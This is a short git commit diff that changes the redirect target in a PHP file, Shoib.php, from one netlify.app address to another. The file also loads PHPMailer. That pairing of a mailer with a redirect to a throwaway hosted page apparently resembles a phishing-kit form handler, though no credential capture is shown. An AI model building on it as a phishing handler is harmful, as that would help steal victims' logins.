c27b105d72b08d109629ac164a4c23396f0579f3
maxibooy <maxiibooy001@gmail.com>
2025-08-27 22:49:01 +0500

    Update Shoib.php

--- Shoib.php
+++ Shoib.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://stunning-horse-36a2cc.netlify.app/");
+header("Location: https://glistening-souffle-ddd210.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
